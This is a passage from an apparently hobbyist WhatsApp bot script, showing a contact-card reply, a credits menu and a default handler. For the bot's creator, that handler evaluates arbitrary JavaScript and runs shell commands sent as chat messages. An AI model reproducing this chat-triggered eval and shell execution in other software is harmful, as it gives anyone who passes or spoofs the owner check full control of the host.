      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐓𝐡𝐞𝐄𝐱𝐭𝐨𝐫𝐝𝐢𝐭𝐜𝐯𝐙𝐚𝐩🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  client.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break
case "tqto":
case "credits": {
let Menu = `┏━━⬣  Thanks To  友
┃ 🔥 RizzNotDev </> Dev\`
┃ 🔥 RizxVelz Official-ID
┗━━⬣  ⿻  ⌜ 𝐑𝐢𝐳𝐳𝐍𝐨𝐭𝐃𝐞𝐯🐉 ⌟  ⿻

> WhatsApp Bot 2025 By RizzNotDev
`
ReplyButton(Menu)
}
break;

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})